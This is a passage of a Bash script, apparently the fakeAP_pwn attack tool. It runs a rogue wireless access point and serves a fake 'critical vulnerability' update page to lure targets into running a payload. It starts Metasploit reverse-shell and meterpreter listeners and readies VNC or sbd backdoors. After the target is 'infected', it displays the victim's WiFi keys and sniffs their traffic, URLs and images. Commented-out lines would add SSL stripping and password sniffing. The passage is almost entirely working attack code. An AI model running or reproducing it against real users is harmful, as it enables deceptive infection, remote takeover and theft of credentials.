   #if [ "$verbose" == "2" ] ; then echo "Command: /opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 AutoRunScript=/tmp/fakeAP_pwn-linux.rb E"; fi
   #$xterm -geometry 75x15+10+215 -T "fakeAP_pwn v$version - Metasploit (OSX)" -e "/opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 AutoRunScript=/tmp/fakeAP_pwn-linux.rb E" &
   command=$(netstat -l -t -p | grep 4565)
   if [ "$command" != "" ] ; then echo -e "\e[00;31m[-]\e[00m The port (4564) is not free." 1>&2; cleanup; fi
   command="/opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 AutoRunScript=/tmp/fakeAP_pwn.rb INTERFACE=$apInterface E" #ExitOnSession=false
   if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
   $xterm -geometry 75x15+10+165 -T "fakeAP_pwn v$version - Metasploit (Windows)" -e "$command" &
   sleep 5 # Need to wait for metasploit, so we have an exploit ready for the target to download...
   if [ -z "$(pgrep ruby)" ] ; then
      echo -e "\e[00;31m[-]\e[00m Metaspliot failed to start." 1>&2
      if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi; if [ "$diagnostics" == "true" ] ; then echo "killall xterm" >> fakeAP_pwn.output; fi
      cleanup
   fi

#----------------------------------------------------------------------------------------------#
#   if [ "$apMode" == "non" ] ; then
#      echo -e "\e[01;32m[>]\e[00m Starting DNS services..."
#      if [ "$verbose" == "2" ] ; then echo "Command: /opt/metasploit3/bin/msfconsole -r /tmp/fakeAP_pwn.dns"; fi
#      $xterm -geometry 75x3+10+145 -T "fakeAP_pwn v$version - FakeDNS" -e "/opt/metasploit3/bin/msfconsole -r /tmp/fakeAP_pwn.dns" &
#      sleep 7
#   fi

#----------------------------------------------------------------------------------------------#
   echo -e "\e[01;32m[>]\e[00m Starting: Web server"
   if [ ! -e /etc/ssl/private/ssl-cert-snakeoil.key ] ; then
      echo -e "\e[00;31m[-]\e[00m Need to renew certificate";
      openssl genrsa -out server.key 1024
      openssl req -new -x509 -key server.key -out server.pem -days 1826
      mv server.key /etc/ssl/private/ssl-cert-snakeoil.key
      mv server.pem /etc/ssl/certs/ssl-cert-snakeoil.pem
   fi
   command="/etc/init.d/apache2 start && ls /etc/apache2/sites-available/ | xargs a2dissite && a2ensite fakeAP_pwn && a2enmod ssl && a2enmod php5 && /etc/init.d/apache2 reload" #dissable all sites and only enable the fakeAP_pwn one
   if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
   $xterm -geometry 75x10+100+0 -T "fakeAP_pwn v$version - Web Sever" -e "$command" &
   sleep 2
   if [ -z "$(pgrep apache2)" ] ; then
      echo -e "\e[00;31m[-]\e[00m Apache2 failed to start." 1>&2
      if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi ; if [ "$diagnostics" == "true" ] ; then echo "killall xterm" >> fakeAP_pwn.output; fi
      cleanup
   fi

if [ "$diagnostics" == "true" ] ; then
    sleep 3
    echo "*Testing Web server**********************" >> fakeAP_pwn.output
    command=$(wget -qO- 10.0.0.1 | grep "<h2>There has been a <u>critical vulnerability</u> discovered in your operating system</h2>")
    if [ "$command" != "" ] ; then
        echo "*Web server is running correctly*" >> fakeAP_pwn.output
        echo -e "\e[01;34m[i]\e[00m Web server: Okay"
    else
        echo "***Web server ISN'T running correctly***" >> fakeAP_pwn.output
        echo "-->Output" >> fakeAP_pwn.output
        wget -qO- 10.0.0.1 >> fakeAP_pwn.output
        echo -e "\e[01;34m[i]\e[00m Web server: Failed" 1>&2;
    fi
    echo "*Commands********************************" >> fakeAP_pwn.output
fi

#----------------------------------------------------------------------------------------------#
   if [ "$payload" == "vnc" ] ; then
      echo -e "\e[01;32m[>]\e[00m Getting the backdoor (VNC) ready..."
      command="vncviewer -listen"
      if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
      $xterm -geometry 75x22+10+440 -T "fakeAP_pwn v$version - VNC" -e "$command" &
   elif [ "$payload" == "sbd" ] ; then
      echo -e "\e[01;32m[>]\e[00m Getting the backdoor (SBD) ready..."
      command="sbd -l -k g0tmi1k -p $port"
      if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
      $xterm -geometry 75x22+10+440 -T "fakeAP_pwn v$version - SBD" -e "$command" &
      sleep 1
   fi

#----------------------------------------------------------------------------------------------#
#   echo -e "\e[01;32m[>]\e[00m Forcing target to vist the fake update site..."
#   if [ "$verbose" == "2" ] ; then echo "Command: iptables -t nat -A PREROUTING -i $apInterface -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1"; fi
#   if [ "$verbose" == "2" ] ; then echo "Command: iptables -t nat -A PREROUTING -i $apInterface -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1"; fi
#   iptables -A INPUT -p udp -i $apInterface --dport 53 -j ACCEPT
#   iptables -A INPUT -p tcp -i $apInterface --dport 80 -j ACCEPT
#   iptables -A INPUT -p tcp -i $apInterface --dport 443 -j ACCEPT
#   iptables -A INPUT -p tcp -i $apInterface --dport $port -j ACCEPT
#   iptables -A INPUT -p udp -i $apInterface --dport $port -j ACCEPT
#   iptables -A INPUT -i $apInterface -j DROP # drop all other traffic
#   iptables -t nat -A PREROUTING -i $apInterface -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1
#   iptables -t nat -A PREROUTING -i $apInterface -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1
#   sleep 1

#----------------------------------------------------------------------------------------------#
   # Wait till target is infected (It's checking for a file to be created by the metasploit script (fakeAP_pwn.rb))
   if [ "$debug" == "true" ] || [ "$verbose" == "2" ] || [ "$diagnostics" == "true" ] ; then
      command="watch -d -n 1 \"arp -n -v -i $apInterface\""
      if [ "$verbose" == "2" ] ; then echo "Command: $command"; fi ; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
      $xterm -geometry 75x5+10+385 -T "fakeAP_pwn v$version - Connect Users" -e "$command" &
   fi
   echo -e "\e[01;33m[*]\e[00m Waiting for target to run the \"update\""
   if [ -e /tmp/fakeAP_pwn.lock ] ; then rm -r /tmp/fakeAP_pwn.lock; fi
   while [ ! -e /tmp/fakeAP_pwn.lock ] ; do
      sleep 5
   done

#----------------------------------------------------------------------------------------------#
   echo -e "\e[01;33m[+]\e[00m Target infected!"
   if [ "$diagnostics" == "true" ] ; then echo "-Target infected!------------------------" >> fakeAP_pwn.output; fi
   targetIP=$(arp -n -v -i at0 | awk '/at0/' | awk -F " " '{print $1}')
   if [ "$verbose" != "0" ] ; then echo -e "\e[01;33m[i]\e[00m Target's IP = $targetIP"; fi; if [ "$diagnostics" == "true" ] ; then echo "Target's IP = $targetIP" >> fakeAP_pwn.output; fi

#----------------------------------------------------------------------------------------------#
   if [ "$apMode" == "transparent" ] ; then
      echo -e "\e[01;32m[>]\e[00m Giving internet access..."
      iptables --flush       # remove existing rules
      iptables --delete-chain
      iptables --zero
      echo 1 > /proc/sys/net/ipv4/ip_forward
      command=$(cat /proc/sys/net/ipv4/ip_forward)
      if [ $command != "1" ] ; then
        echo -e "\e[00;31m[-]\e[00m Can't enable ip_forward" 1>&2
        cleanup
      fi
#      iptables --table nat --append POSTROUTING -s 10.0.0.0/24 --out-interface $interface --jump MASQUERADE
#      iptables -A FORWARD -s 10.0.0.0/24 -o $interface -j ACCEPT
##      iptables -A FORWARD -d 10.0.0.0/24 -m conntrack --ctstate ESTABLISHED,RELATED -i $interface -j ACCEPT <--- gives error: iptables: Protocol wrong type for socket
#      iptables --append FORWARD --in-interface $apInterface --jump ACCEPT
#      iptables --table nat --append PREROUTING --proto udp --jump DNAT --to $gatewayIP
##      iptables -A INPUT -m iprange --src-range 10.0.0.150-10.0.0.250 -i $interface -d $gatewayIP -p all -j DROP  #protect the gateway <--- gives error: iptables: No chain/target/match by that name

#      Temp fix till the above stuff works.
      iptables --table nat --append POSTROUTING --out-interface $interface --jump MASQUERADE
      iptables --append FORWARD --in-interface $apInterface --jump ACCEPT
      iptables --table nat --append PREROUTING --proto udp --destination-port 53 --jump DNAT --to-destination $gatewayIP
   fi

#----------------------------------------------------------------------------------------------#
   if [ "$payload" == "wkv" ] ; then
      echo -e "\e[01;32m[>]\e[00m Opening WiFi Keys..."
      xterm -hold -geometry 130x22+10+440 -T "fakeAP_pwn v$version - WiFi Keys" -e "cat /tmp/fakeAP_pwn.wkv" & # Don't close! We want to view this!
      sleep 1
   fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$extras" == "true" ] ; then
   echo -e "\e[01;32m[>]\e[00m Caputuring infomation about the target..."
   command="tcpdump -i $apInterface -w /tmp/fakeAP_pwn.cap"
   if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
   $xterm -geometry 100x10+650+640 -T "fakeAP_pwn v$version - tcpdump" -e "$command" &       # Dump all trafic into a file
   command="urlsnarf -i $apInterface"
   if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
   $xterm -geometry 75x10+10+0    -T "fakeAP_pwn v$version - URLs" -e "$command" &           # URLs
   command="driftnet -i $apInterface"
   if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
   $xterm -geometry 75x10+10+465  -T "fakeAP_pwn v$version - Images" -e "$command" &         # Images
   #iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
   #command="sslstrip -k -f -l 10000 -w /tmp/fakeAP_pwn.ssl"
   #if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
   #$xterm -geometry 0x0+0+0 -T "fakeAP_pwn v$version - SSLStrip" -e "$command" &            # SSLStrip
   #command="dsniff -i $apInterface -w /tmp/fakeAP_pwn.dsniff"
   #if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
   #$xterm -geometry 75x10+10+155  -T "fakeAP_pwn v$version - Passwords" -e "$command" &     # Passwords
   #command="ettercap -T -q -p -i $apInterface // //"
   #if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
   #$xterm -geometry 75x10+460+155 -T "fakeAP_pwn v$version - Passwords (2)" -e "$command" & # Passwords (again)
   #command="msgsnarf -i $apInterface"
   #if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
   #$xterm -geometry 75x10+10+310  -T "fakeAP_pwn v$version - IM" -e "$command" &            # IM
   #command="imsniff $apInterface"
   #if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
   #$xterm -geometry 75x10+10+310  -T "fakeAP_pwn v$version - IM (2)" -e "$command" &        # IM (again)
#----------------------------------------------------------------------------------------------#
elif [ "$apMode" == "normal" ] ; then
   if [ "$debug" == "true" ] || [ "$verbose" == "2" ] || [ "$diagnostics" == "true" ] ; then
      command="watch -d -n 1 \"arp -n -v -i $apInterface\""
      if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
      $xterm -geometry 75x5+10+385 -T "fakeAP_pwn v$version - Connect Users" -e "$command" &
   fi
   echo -e "\e[01;33m[*]\e[00m Ready! ...press CTRL+C to stop"
   for (( ; ; ))
   do
      sleep 1
   done
fi

#----------------------------------------------------------------------------------------------#
if [ "$diagnostics" == "true" ] ; then echo "-Done!-----------------------------------" >> fakeAP_pwn.output; fi
cleanup clean
